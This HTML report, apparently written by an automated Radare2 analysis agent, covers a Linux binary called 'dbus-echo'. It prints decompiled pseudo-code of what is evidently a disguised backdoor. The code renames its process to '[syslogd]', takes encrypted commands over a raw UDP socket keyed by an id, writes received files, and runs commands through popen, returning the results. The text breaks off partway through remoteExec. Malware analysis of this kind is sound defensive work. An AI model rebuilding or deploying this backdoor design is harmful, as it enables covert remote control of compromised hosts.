@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Radare2 Analysis Report - dbus-echo</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root { --agent-color: #e8710a; --primary: #1f2937; --border: #e5e7eb; }
+        body { font-family: 'Roboto', sans-serif; background-color: #f3f4f6; color: #111827; }
+        .page-container { max-width: 1100px; margin: 20px auto; background: white; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); padding: 32px 40px; }
+        .mono { font-family: 'Roboto Mono', monospace; font-size: 0.85rem; }
+        .agent-badge { display: inline-block; background: var(--agent-color); color: white; padding: 4px 16px; border-radius: 4px; font-weight: 700; font-size: 14px; letter-spacing: 0.05em; text-transform: uppercase; }
+        h1 { font-size: 26px; font-weight: 700; color: var(--primary); margin: 0 0 4px 0; }
+        h2.section-header { font-size: 14pt; font-weight: 700; text-transform: uppercase; color: var(--primary); border-bottom: 2px solid var(--agent-color); padding-bottom: 6px; margin-top: 36px; margin-bottom: 16px; }
+        .meta-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; background: #f9fafb; border: 1px solid #d1d5db; padding: 14px; margin-bottom: 24px; font-size: 0.9rem; }
+        .meta-label { font-weight: 600; color: #4b5563; text-transform: uppercase; font-size: 0.7rem; }
+        table.data-table { width: 100%; border-collapse: collapse; margin: 12px 0 24px 0; font-size: 0.88rem; }
+        table.data-table th { background: #e5e7eb; font-weight: 700; text-transform: uppercase; font-size: 0.72rem; color: #374151; padding: 8px 10px; text-align: left; border-bottom: 2px solid #9ca3af; }
+        table.data-table td { padding: 6px 10px; border-bottom: 1px solid #e5e7eb; }
+        table.data-table td.prop { font-weight: 600; color: #4b5563; width: 180px; white-space: nowrap; }
+        table.data-table tr:hover { background: #f9fafb; }
+        .decomp-block { margin-bottom: 20px; border: 1px solid #d1d5db; border-radius: 4px; overflow: hidden; }
+        .decomp-header { background: var(--agent-color); color: white; padding: 8px 14px; font-family: 'Roboto Mono', monospace; font-size: 0.85rem; font-weight: 500; }
+        .decomp-block pre { margin: 0; padding: 14px; background: #f8f9fa; overflow-x: auto; font-size: 0.82rem; line-height: 1.5; }
+        .decomp-block code { font-family: 'Roboto Mono', monospace; color: #1f2937; }
+        .summary-box { background: #f9fafb; border: 1px solid #d1d5db; padding: 20px; border-radius: 4px; margin-top: 8px; }
+        .summary-box p { margin-bottom: 10px; line-height: 1.6; font-size: 10.5pt; }
+        .summary-box ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 10px; }
+        .summary-box li { margin-bottom: 5px; }
+        .summary-box pre { background: #f3f4f6; border: 1px solid #d1d5db; border-left: 4px solid #6b7280; padding: 12px; overflow-x: auto; font-size: 0.82rem; margin: 14px 0; }
+        .summary-box code { font-family: 'Roboto Mono', monospace; background: #f3f4f6; padding: 2px 4px; font-size: 0.88em; color: #b91c1c; }
+        .summary-box pre code { color: #374151; background: none; padding: 0; }
+        .summary-box h3 { font-size: 1.05rem; font-weight: 700; color: #1f2937; margin-top: 1.2rem; margin-bottom: 0.6rem; border-bottom: 1px dotted #d1d5db; padding-bottom: 4px; }
+        .summary-box table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 0.88rem; border: 1px solid #d1d5db; }
+        .summary-box th { background: #e5e7eb; font-weight: 700; text-transform: uppercase; font-size: 0.72rem; padding: 8px 10px; text-align: left; border-bottom: 2px solid #9ca3af; }
+        .summary-box td { padding: 6px 10px; border-bottom: 1px solid #e5e7eb; }
+        .stat { display: inline-block; background: #f3f4f6; border: 1px solid #d1d5db; padding: 12px 20px; border-radius: 4px; text-align: center; margin: 6px; }
+        .stat .num { font-size: 28px; font-weight: 700; color: var(--agent-color); }
+        .stat .lbl { font-size: 0.72rem; color: #6b7280; text-transform: uppercase; font-weight: 600; }
+        .no-print { }
+        @media print { body { background: white; } .page-container { margin: 0; box-shadow: none; } .no-print { display: none !important; } }
+    </style>
+</head>
+<body>
+    <div class="no-print" style="position: fixed; bottom: 32px; right: 32px; z-index: 50;">
+        <button onclick="window.print()" style="background: var(--agent-color); color: white; padding: 10px 20px; border: none; cursor: pointer; font-weight: 600; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.2);">Print / Save PDF</button>
+    </div>
+
+    <div class="page-container">
+        <!-- Header -->
+        <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid var(--agent-color); padding-bottom: 16px; margin-bottom: 20px;">
+            <div>
+                <div style="margin-bottom: 8px;"><span class="agent-badge">Radare2</span></div>
+                <h1>Agent Analysis Report</h1>
+                <div style="font-size: 13px; color: #6b7280;">Per-tool findings for binary <span class="mono">dbus-echo</span></div>
+            </div>
+            <div style="text-align: right; font-size: 13px; color: #6b7280;">
+                <div>2026-02-10 03:33 UTC</div>
+                <div class="mono">Session: d20a8389</div>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div style="text-align: center; margin-bottom: 24px;">
+            <div class="stat"><div class="num">42</div><div class="lbl">Functions Found</div></div>
+            <div class="stat"><div class="num">25</div><div class="lbl">Decompiled</div></div>
+            <div class="stat"><div class="num">9</div><div class="lbl">Strings</div></div>
+        </div>
+
+        <!-- Binary Information -->
+        <h2 class="section-header">Binary Information</h2>
+        <table class="data-table">
+            <tbody>
+                <tr><td class="prop">SHA-256</td><td class="mono" style="word-break:break-all">827f41fc1a6f8a4c8a8575b3e2349aeaba0dfc2c9390ef1cceeef1bb85c34161</td></tr>
+                
+        <tr><td class="prop">Architecture</td><td>x86</td></tr>
+        <tr><td class="prop">Bits</td><td>64</td></tr>
+        <tr><td class="prop">OS</td><td>linux</td></tr>
+        <tr><td class="prop">Endian</td><td>little</td></tr>
+        <tr><td class="prop">Stripped</td><td>False</td></tr>
+        <tr><td class="prop">Imports</td><td class="mono" style="word-break:break-all">__sysv_signal, printf, memset, __gmon_start__, puts, fseek, htons, exit, fopen, __libc_start_main, recv, setsockopt, pclose, sprintf, ntohs, fgetc, strerror, memcpy, socket, __errno_location</td></tr>
+        <tr><td class="prop">Exports</td><td class="mono" style="word-break:break-all">__libc_csu_fini, _start, _fini, sendResult2Peer, _IO_stdin_used, __data_start, checksum, __dso_handle, __DTOR_END__, __libc_csu_init, initPz, myDecryptFun, __bss_start, file, remoteExec, _end, myEncryptFun, filesize, _edata, udp_tcp_checksum</td></tr>
+        <tr><td class="prop">Functions Discovered</td><td>42</td></tr>
+        <tr><td class="prop">Functions Decompiled</td><td>25</td></tr>
+            </tbody>
+        </table>
+
+        <!-- Functions -->
+        <h2 class="section-header">Functions (42 discovered)</h2>
+        <table class="data-table">
+            <thead><tr><th>Name</th><th>Address</th><th>Size</th><th>XRefs</th><th>Decompiled</th></tr></thead>
+            <tbody><tr><td class="mono">sym.imp.__sysv_signal</td><td class="mono">0x4008f8</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.printf</td><td class="mono">0x400908</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.memset</td><td class="mono">0x400918</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.puts</td><td class="mono">0x400928</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.fseek</td><td class="mono">0x400938</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.htons</td><td class="mono">0x400948</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.exit</td><td class="mono">0x400958</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.fopen</td><td class="mono">0x400968</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.__libc_start_main</td><td class="mono">0x400978</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.recv</td><td class="mono">0x400988</td><td>6</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.imp.setsockopt</td><td class="mono">0x400998</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.pclose</td><td class="mono">0x4009a8</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.sprintf</td><td class="mono">0x4009b8</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.ntohs</td><td class="mono">0x4009c8</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.fgetc</td><td class="mono">0x4009d8</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.strerror</td><td class="mono">0x4009e8</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.memcpy</td><td class="mono">0x4009f8</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.socket</td><td class="mono">0x400a08</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.__errno_location</td><td class="mono">0x400a18</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.strcpy</td><td class="mono">0x400a28</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.fclose</td><td class="mono">0x400a38</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.fork</td><td class="mono">0x400a48</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.sendto</td><td class="mono">0x400a58</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.fwrite</td><td class="mono">0x400a68</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.perror</td><td class="mono">0x400a78</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym.imp.popen</td><td class="mono">0x400a88</td><td>6</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">entry0</td><td class="mono">0x400aa0</td><td>41</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.call_gmon_start</td><td class="mono">0x400acc</td><td>23</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.__do_global_dtors_aux</td><td class="mono">0x400af0</td><td>93</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.frame_dummy</td><td class="mono">0x400b50</td><td>38</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.__do_global_ctors_aux</td><td class="mono">0x401840</td><td>54</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.__libc_csu_fini</td><td class="mono">0x4017a0</td><td>2</td><td>0</td><td>No</td></tr>
+<tr><td class="mono">sym._fini</td><td class="mono">0x401878</td><td>14</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.sendResult2Peer</td><td class="mono">0x401216</td><td>840</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.checksum</td><td class="mono">0x40163e</td><td>122</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.__libc_csu_init</td><td class="mono">0x4017b0</td><td>139</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.myDecryptFun</td><td class="mono">0x4015ce</td><td>112</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.remoteExec</td><td class="mono">0x4010ce</td><td>328</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.myEncryptFun</td><td class="mono">0x40155e</td><td>112</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym.udp_tcp_checksum</td><td class="mono">0x4016b8</td><td>224</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">main</td><td class="mono">0x400b78</td><td>1366</td><td>0</td><td>Yes</td></tr>
+<tr><td class="mono">sym._init</td><td class="mono">0x4008d0</td><td>24</td><td>0</td><td>Yes</td></tr>
+</tbody>
+        </table>
+
+        <!-- Decompiled Code -->
+        <h2 class="section-header">Decompiled Code (25 functions)</h2>
+        
+        <div class="decomp-block">
+            <div class="decomp-header">main</div>
+            <pre><code>/* r2dec pseudo code output (r2 6.0.8) */
+/* /data/shared/dbus-echo @ 0x400b78 */
+#include &lt;stdint.h&gt;
+ 
+int32_t main (int32_t argc, char ** argv) {
+    int64_t var_e60h;
+    int64_t var_e58h;
+    int64_t var_e50h;
+    int64_t var_e48h;
+    char ** var_e40h;
+    int64_t var_e34h;
+    char  s;
+    int64_t var_848h;
+    void  optval;
+    void  buffer;
+    uint32_t socket;
+    ssize_t var_34h;
+    int64_t var_30h;
+    int64_t var_24h;
+    int64_t var_20h;
+    int64_t var_18h;
+    void * ptr;
+    int64_t var_6h;
+    int64_t var_4h;
+    rdi = argc;
+    rsi = argv;
+    *((rbp - 0xe34)) = edi;
+    *((rbp - 0xe40)) = rsi;
+    *((rbp - 0x38)) = 0xffffffff;
+    memset (rbp - 0x840, 0, 0x800);
+    rax = *((rbp - 0xe40));
+    rax = *(rax);
+    rcx = 0xffffffffffffffff;
+    *((rbp - 0xe48)) = rax;
+    eax = 0;
+    rdi = *((rbp - 0xe48));
+    __asm (&quot;repne scasb al, byte [rdi]&quot;);
+    rax = rcx;
+    rax = ~rax;
+    rax--;
+    if (rax &lt;= 8) {
+        goto label_1;
+    }
+    rax = *((rbp - 0xe40));
+    rax = *(rax);
+    rcx = 0xffffffffffffffff;
+    *((rbp - 0xe50)) = rax;
+    eax = 0;
+    rdi = *((rbp - 0xe50));
+    __asm (&quot;repne scasb al, byte [rdi]&quot;);
+    rax = rcx;
+    rax = ~rax;
+    rdx = rax - 1;
+    rax = *((rbp - 0xe40));
+    rax = *(rax);
+    rdi = *(rax);
+    rcx = rdx;
+    eax = 0;
+    do {
+        *(rdi) = al;
+        rcx--;
+        rdi++;
+    } while (rcx != 0);
+    rax = *((rbp - 0xe40));
+    rax = *(rax);
+    *(rax) = 0x7379735b;
+    *((rax + 4)) = 0x64676f6c;
+    *((rax + 8)) = 0x5d;
+label_1:
+    esi = 1;
+    edi = 0x11;
+    sysv_signal ();
+    eax = socket (2, 3, 0x11);
+    *((rbp - 0x38)) = eax;
+    if (*((rbp - 0x38)) == 0xffffffff) {
+        rax = errno_location ();
+        rax = strerror (*(rax));
+        rsi = rax;
+        eax = 0;
+        printf (&quot;socket(): %s\n&quot;);
+        exit (1);
+    }
+    *((rbp - 0x844)) = 1;
+    eax = setsockopt (*((rbp - 0x38)), 0, 3, rbp - 0x844, 4);
+    if (eax &gt;= 0) {
+        goto label_0;
+    }
+    puts (&quot;setsockopt error!&quot;);
+    while (*((rbp - 0x34)) &lt;= 0) {
+label_0:
+        rax = rbp - 0x840;
+        memset (rax, 0, 0x800);
+        ecx = 0;
+        edx = 0x800;
+        eax = recv (*((rbp - 0x38)), rbp - 0x840);
+        *((rbp - 0x34)) = eax;
+    }
+    rax = rbp - 0x840;
+    *((rbp - 0x30)) = rax;
+    *((rbp - 0x24)) = 0x14;
+    eax = *((rbp - 0x24));
+    rax = (int64_t) eax;
+    rdx = rax;
+    rax = rbp - 0x840;
+    rax += rdx;
+    *((rbp - 0x20)) = rax;
+    rax = *((rbp - 0x20));
+    eax = *((rax + 2));
+    edi = (int32_t) ax;
+    ax = ntohs ();
+    if (ax != 0x84b) {
+        goto label_0;
+    }
+    eax = *((rbp - 0x24));
+    eax += 8;
+    *((rbp - 0x24)) = eax;
+    eax = *((rbp - 0x24));
+    rax = (int64_t) eax;
+    rdx = rax;
+    rax = rbp - 0x840;
+    rax += rdx;
+    *((rbp - 0x18)) = rax;
+    eax = *((rbp - 0x24));
+    eax += 0xc;
+    *((rbp - 0x24)) = eax;
+    rax = *((rbp - 0x18));
+    eax = *((rax + 1));
+    if (al != 1) {
+        goto label_0;
+    }
+    eax = *((rbp - 0x24));
+    rax = (int64_t) eax;
+    rdx = rax;
+    rax = rbp - 0x840;
+    rax += rdx;
+    *((rbp - 0x10)) = rax;
+    *((rbp - 0x848)) = 0;
+    rax = *((rbp - 0x10));
+    rax += 5;
+    rdx = rbp - 0x848;
+    eax = *(rax);
+    *(rdx) = eax;
+    edx = *((rbp - 0x848));
+    eax = *(obj.idkey);
+    if (edx != eax) {
+        edx = *(obj.idkey);
+        esi = *((rbp - 0x848));
+        eax = 0;
+        printf (&quot;idkey not correct,%d!=%d\n&quot;);
+        goto label_0;
+    }
+    rax = *((rbp - 0x10));
+    eax = *((rax + 0xa));
+    ecx = (int32_t) ax;
+    rax = *((rbp - 0x10));
+    eax = *((rax + 9));
+    edx = (int32_t) al;
+    esi = *((rbp - 0x34));
+    eax = 0;
+    printf (&quot;receive %d, cmd type is %d and cmdl is %d\n&quot;);
+    rsi = *((rbp - 0x10));
+    rsi += 0xc;
+    rax = *((rbp - 0x10));
+    eax = *((rax + 0xa));
+    ecx = (int32_t) ax;
+    rdx = *((rbp - 0x10));
+    rdx += 0xc;
+    edi = obj.idkey;
+    r8 = rsi;
+    esi = 4;
+    myDecryptFun ();
+    rax = *((rbp - 0x10));
+    eax = *((rax + 9));
+    if (al == 0) {
+        goto label_2;
+    }
+    rax = *((rbp - 0x10));
+    eax = *((rax + 9));
+    if (al == 1) {
+        rax = *((rbp - 0x10));
+        rax += 0xc;
+        eax = *(rax);
+        *(obj.idkey) = eax;
+        rdi = rbp - 0xe30;
+        ecx = 0x32;
+        eax = 0;
+        *(rdi) = al;
+        rcx--;
+        rdi++;
+        rax = rbp - 0xe30;
+        rcx = 0xffffffffffffffff;
+        *((rbp - 0xe58)) = rax;
+        eax = 0;
+        rdi = *((rbp - 0xe58));
+        __asm (&quot;repne scasb al, byte [rdi]&quot;);
+        rax = rcx;
+        rax = ~rax;
+        rax--;
+        ecx = (int32_t) ax;
+        r9 = rbp - 0xe30;
+        eax = *((rbp - 0x34));
+        edx = (int32_t) ax;
+        rsi = rbp - 0x840;
+        edi = *((rbp - 0x38));
+        r8d = ecx;
+        rcx = r9;
+        sendResult2Peer ();
+        goto label_0;
+    }
+    rax = *((rbp - 0x10));
+    eax = *((rax + 9));
+    if (al != 2) {
+        goto label_2;
+    }
+    rax = *(obj.file);
+    if (rax == 0) {
+        rax = fopen (&quot;system.conf&quot;, 0x401903);
+        *(obj.file) = rax;
+        edx = 0;
+        fseek (*(obj.file), 0, edx);
+    }
+    rax = *((rbp - 0x10));
+    eax = *((rax + 0xa));
+    edx = (int32_t) ax;
+    rdi += 0xc;
+    fwrite (*((rbp - 0x10)), 1, rdx, *(obj.file));
+    rax = *((rbp - 0x10));
+    eax = *((rax + 0xa));
+    edx = (int32_t) ax;
+    eax = *(obj.filesize);
+    eax = rdx + rax;
+    *(obj.filesize) = eax;
+    rax = *((rbp - 0x10));
+    edx = *((rax + 0xa));
+    eax = *(obj.initPz);
+    if (dx == ax) {
+        goto label_0;
+    }
+    fclose (*(obj.file));
+    *(obj.file) = 0;
+    rdi = rbp - 0xe30;
+    ecx = 0x32;
+    eax = 0;
+    *(rdi) = al;
+    rcx--;
+    rdi++;
+    eax = 0;
+    sprintf (rbp - 0xe30, &quot;%d file data is received\n&quot;, *(obj.filesize));
+    rsi = rbp - 0xe30;
+    eax = 0;
+    printf (0x40192c);
+    rax = rbp - 0xe30;
+    rcx = 0xffffffffffffffff;
+    *((rbp - 0xe60)) = rax;
+    eax = 0;
+    rdi = *((rbp - 0xe60));
+    __asm (&quot;repne scasb al, byte [rdi]&quot;);
+    rax = rcx;
+    rax = ~rax;
+    rax--;
+    ecx = (int32_t) ax;
+    r9 = rbp - 0xe30;
+    eax = *((rbp - 0x34));
+    edx = (int32_t) ax;
+    rsi = rbp - 0x840;
+    edi = *((rbp - 0x38));
+    r8d = ecx;
+    rcx = r9;
+    sendResult2Peer ();
+    *(obj.filesize) = 0;
+    goto label_0;
+label_2:
+    eax = fork ();
+    if (eax != 0) {
+        goto label_0;
+    }
+    memset (rbp - 0xe30, 0, 0x5dc);
+    rax = *((rbp - 0x10));
+    rax += 0xc;
+    rdi = rax;
+    rsi = rbp - 0xe30;
+    ax = remoteExec ();
+    *((rbp - 6)) = ax;
+    rsi = rbp - 0xe30;
+    eax = 0;
+    printf (&quot;excute result is %s\n&quot;);
+    ecx = *((rbp - 6));
+    r9 = rbp - 0xe30;
+    eax = *((rbp - 0x34));
+    edx = (int32_t) ax;
+    rsi = rbp - 0x840;
+    edi = *((rbp - 0x38));
+    r8d = ecx;
+    rcx = r9;
+    eax = sendResult2Peer ();
+    *((rbp - 4)) = eax;
+    esi = *((rbp - 4));
+    do {
+    } while (rcx != 0);
+    eax = 0;
+    printf (&quot;send %d\n&quot;);
+    return exit (0);
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.sendResult2Peer</div>
+            <pre><code>/* r2dec pseudo code output (r2 6.0.8) */
+/* /data/shared/dbus-echo @ 0x401216 */
+#include &lt;stdint.h&gt;
+ 
+uint64_t sendResult2Peer (uint32_t arg1, size_t arg2, char  arg3, int64_t arg4) {
+    uint32_t var_654h;
+    char  var_650h;
+    uint32_t var_644h;
+    size_t s2;
+    uint32_t var_634h;
+    int64_t var_630h;
+    int64_t var_62eh;
+    int64_t var_62ch;
+    void * s1;
+    int64_t var_3ch;
+    int64_t var_38h;
+    int64_t var_2ch;
+    int64_t var_28h;
+    int64_t var_1ah;
+    int64_t var_18h;
+    int64_t var_10h;
+    int64_t var_2h;
+    rdi = arg1;
+    rsi = arg2;
+    rcx = arg3;
+    r8 = arg4;
+    *((rbp - 0x634)) = edi;
+    *((rbp - 0x640)) = rsi;
+    *((rbp - 0x650)) = rcx;
+    eax = r8d;
+    *((rbp - 0x644)) = dx;
+    *((rbp - 0x654)) = ax;
+    memset (rbp - 0x620, 0, 0x5dc);
+    *((rbp - 0x3c)) = 0;
+    if (*((rbp - 0x644)) &gt; 0x5db) {
+        goto label_0;
+    }
+    ecx = *((rbp - 0x644));
+    rax = rbp - 0x620;
+    rdx = *((rbp - 0x640));
+    rdi = rax;
+    rsi = rdx;
+    do {
+        *(rdi) = *(rsi);
+        rcx--;
+        rsi++;
+        rdi++;
+    } while (rcx != 0);
+    goto label_1;
+label_0:
+    rax = rbp - 0x620;
+    rdx = *((rbp - 0x640));
+    memcpy (rax, rdx, 0x5dc);
+label_1:
+    rax = rbp - 0x620;
+    *((rbp - 0x38)) = rax;
+    rax = *((rbp - 0x38));
+    eax = *((rax + 0xc));
+    *((rbp - 0x2c)) = eax;
+    rax = *((rbp - 0x38));
+    edx = *((rax + 0x10));
+    rax = *((rbp - 0x38));
+    *((rax + 0xc)) = edx;
+    rdx = *((rbp - 0x38));
+    eax = *((rbp - 0x2c));
+    *((rdx + 0x10)) = eax;
+    eax = *((rbp - 0x3c));
+    eax += 0x14;
+    *((rbp - 0x3c)) = eax;
+    eax = *((rbp - 0x3c));
+    rax = (int64_t) eax;
+    rdx = rax;
+    rax = rbp - 0x620;
+    rax += rdx;
+    *((rbp - 0x28)) = rax;
+    eax = *((rbp - 0x3c));
+    eax += 8;
+    *((rbp - 0x3c)) = eax;
+    rax = *((rbp - 0x28));
+    eax = *((rax + 2));
+    *((rbp - 0x1a)) = ax;
+    rax = *((rbp - 0x28));
+    edx = *(rax);
+    rax = *((rbp - 0x28));
+    *((rax + 2)) = dx;
+    rdx = *((rbp - 0x28));
+    eax = *((rbp - 0x1a));
+    *(rdx) = ax;
+    eax = *((rbp - 0x3c));
+    rax = (int64_t) eax;
+    rdx = rax;
+    rax = rbp - 0x620;
+    rax += rdx;
+    *((rbp - 0x18)) = rax;
+    rax = *((rbp - 0x18));
+    *((rax + 1)) = 2;
+    eax = *((rbp - 0x3c));
+    eax += 0xc;
+    *((rbp - 0x3c)) = eax;
+    eax = *((rbp - 0x3c));
+    rax = (int64_t) eax;
+    rdx = rax;
+    rax = rbp - 0x620;
+    rax += rdx;
+    *((rbp - 0x10)) = rax;
+    rax = *((rbp - 0x10));
+    *((rax + 1)) = 2;
+    if (*((rbp - 0x654)) &gt; 0x4af) {
+        rax = *((rbp - 0x10));
+        rax += 0xc;
+        edi = obj.idkey;
+        rdx = *((rbp - 0x650));
+        r8 = rax;
+        ecx = 0x4b0;
+        esi = 4;
+        myEncryptFun ();
+        edi = 0x4d0;
+        eax = htons ();
+        edx = eax;
+        rax = *((rbp - 0x28));
+        *((rax + 4)) = dx;
+        rax = *((rbp - 0x10));
+        *((rax + 0xa)) = 0x4b0;
+    } else {
+        rax = *((rbp - 0x10));
+        rax += 0xc;
+        ecx = *((rbp - 0x654));
+        edi = obj.idkey;
+        rdx = *((rbp - 0x650));
+        r8 = rax;
+        esi = 4;
+        myEncryptFun ();
+        eax = *((rbp - 0x654));
+        eax += 0x20;
+        edi = (int32_t) ax;
+        eax = htons ();
+        edx = eax;
+        rax = *((rbp - 0x28));
+        *((rax + 4)) = dx;
+        rdx = *((rbp - 0x10));
+        eax = *((rbp - 0x654));
+        *((rdx + 0xa)) = ax;
+    }
+    rax = *((rbp - 0x10));
+    eax = *((rax + 0xa));
+    eax += 0x10;
+    edi = (int32_t) ax;
+    eax = htons ();
+    edx = eax;
+    rax = *((rbp - 0x18));
+    *((rax + 2)) = dx;
+    rax = *((rbp - 0x10));
+    edx = *((rax + 1));
+    rax = *((rbp - 0x10));
+    eax = *((rax + 0xa));
+    eax = rdx + rax;
+    edx = rax + 7;
+    rax = *((rbp - 0x10));
+    *((rax + 1)) = dx;
+    rax = *((rbp - 0x10));
+    eax = *((rax + 1));
+    edi = (int32_t) ax;
+    eax = htons ();
+    edx = eax;
+    rax = *((rbp - 0x10));
+    *((rax + 1)) = dx;
+    rax = *((rbp - 0x28));
+    eax = *((rax + 4));
+    edi = (int32_t) ax;
+    ax = ntohs ();
+    *((rbp - 2)) = ax;
+    rax = *((rbp - 0x28));
+    *((rax + 6)) = 0;
+    ecx = *((rbp - 2));
+    rdi = *((rbp - 0x28));
+    rax = *((rbp - 0x38));
+    edx = *((rax + 0x10));
+    rax = *((rbp - 0x38));
+    esi = *((rax + 0xc));
+    r8d = ecx;
+    rcx = rdi;
+    edi = 0x11;
+    eax = udp_tcp_checksum ();
+    edx = eax;
+    rax = *((rbp - 0x28));
+    *((rax + 6)) = dx;
+    rdx = *((rbp - 0x38));
+    eax = *((rdx + 6));
+    eax |= 0x40;
+    *((rdx + 6)) = al;
+    eax = *((rbp - 2));
+    eax += 0x14;
+    edi = (int32_t) ax;
+    eax = htons ();
+    edx = eax;
+    rax = *((rbp - 0x38));
+    *((rax + 2)) = dx;
+    rax = *((rbp - 0x38));
+    *((rax + 0xa)) = 0;
+    eax = *((rbp - 2));
+    eax += 0x14;
+    esi = eax;
+    rdi = rbp - 0x620;
+    eax = checksum ();
+    edx = eax;
+    rax = *((rbp - 0x38));
+    *((rax + 0xa)) = dx;
+    rax = *((rbp - 0x38));
+    eax = *((rax + 0x10));
+    *((rbp - 0x62c)) = eax;
+    *((rbp - 0x630)) = 2;
+    rax = *((rbp - 0x28));
+    eax = *((rax + 2));
+    *((rbp - 0x62e)) = ax;
+    rdx = rbp - 0x630;
+    eax = *((rbp - 2));
+    rax += 0x14;
+    rsi = rbp - 0x620;
+    edi = *((rbp - 0x634));
+    r9d = 0x10;
+    r8 = rdx;
+    ecx = 0;
+    rdx = rax;
+    sendto ();
+    return rax;
+}</code></pre>
+        </div>
+        <div class="decomp-block">
+            <div class="decomp-header">sym.remoteExec</div>
+            <pre><code>/* r2dec pseudo code output (r2 6.0.8) */
+/* /data/shared/dbus-echo @ 0x4010ce */
+#include &lt;stdint.h&gt;
+ 
+int64_t remoteExec (char * arg1, char  arg2) {
+    int64_t var_40h;
+    char * var_38h;
+    char * var_30h;
+    uint32_t var_24h;
+    char  dest;
+    char * filename;
+    file* stream;
+    uint32_t var_4h;
+    uint32_t var_1h;
+    rdi = arg1;
+    rsi = arg2;
+    *((rbp - 0x18)) = rdi;
+    *((rbp - 0x20)) = rsi;
+    strcpy (*((rbp - 0x20)), *((rbp - 0x18)));
+    rax = *((rbp - 0x20));
+    rcx = 0xffffffffffffffff;
+    *((rbp - 0x30)) = rax;
+    eax = 0;
+    rdi = *((rbp - 0x30));
+    __asm (&quot;repne scasb al, byte [rdi]&quot;);
+    rax = rcx;
+    rax = ~rax;
+    rax--;
+    rax += *((rbp - 0x20));
+    *(rax) = 0x200a;
+    *((rax + 2)) = 0;
+    rax = *((rbp - 0x20));
+    rcx = 0xffffffffffffffff;
+    *((rbp - 0x38)) = rax;
+    eax = 0;
+    rdi = *((rbp - 0x38));
+    __asm (&quot;repne scasb al, byte [rdi]&quot;);
+    rax = rcx;
+    rax = ~rax;
+    rax--;
+    *((rbp - 4)) = ax;
+    eax = 0;
+    rax = popen (*((rbp - 0x18)), 0x40194d);
+    rax = (int64_t) eax;
+    *((rbp - 0x10)) = rax;
+    if (*((rbp - 0x10)) != 0) {
+        goto label_0;
+    }
+    perror (*((rbp - 0x18)));
+    eax = 0;
+    pclose (*((rbp - 0x10)));
+    eax = *((rbp - 4));
+    rdi += *((rbp - 0x20));
+    eax = 0;
+    sprintf (rax, &quot;server error: &#x27;%s&#x27; cannt execute\n&quot;, *((rbp - 0x18)));
+    rax = *((rbp - 0x20));
+    rcx = 0xffffffffffffffff;
+    *((rbp - 0x40)) = rax;
+    eax = 0;
+    rdi = *((rbp - 0x40));
+    __asm (&quot;repne scasb al, byte [rdi]&quot;);
+    rax = rcx;
+    rax = ~rax;
+    rax--;
+    eax = (int32_t) ax;
+    *((rbp - 0x24)) = eax;
+    goto label_1;
+    do {
+        al = fgetc (*((rbp - 0x10)));
+        *((rbp - 1)) = al;
+        if (*((rbp - 1)) == 0xff) {
+            goto label_2;
+        }
+        eax = *((rbp - 4));
+        rdx = rax;
